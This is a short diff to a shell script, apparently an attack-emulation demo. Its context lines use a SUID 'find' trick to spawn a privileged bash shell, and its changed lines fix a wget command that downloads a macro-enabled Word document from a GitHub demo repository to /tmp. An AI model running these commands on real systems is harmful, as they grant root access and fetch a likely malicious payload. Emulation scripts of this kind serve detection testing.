@@ -28,7 +28,7 @@ echo "chmod +s `which find`;echo 'id;sleep 5;exit'|su - ggiitt -c 'find / -exec 
 chmod +s `which find`;echo 'id;sleep 5;exit'|su - ggiitt -c 'find / -exec bash -p \; -quit';chmod -s `which find`
 sleep 5
 date
-echo "wget https://raw.githubusercontent.com/mangosteen/demo/master/v.docm -o /tmp/v.docm"
-wget https://raw.githubusercontent.com/mangosteen/demo/master/v.docm -o /tmp/v.docm
+echo "wget https://raw.githubusercontent.com/mangosteen/demo/master/v.docm -O /tmp/v.docm"
+wget https://raw.githubusercontent.com/mangosteen/demo/master/v.docm -O /tmp/v.docm
 sleep 5
 
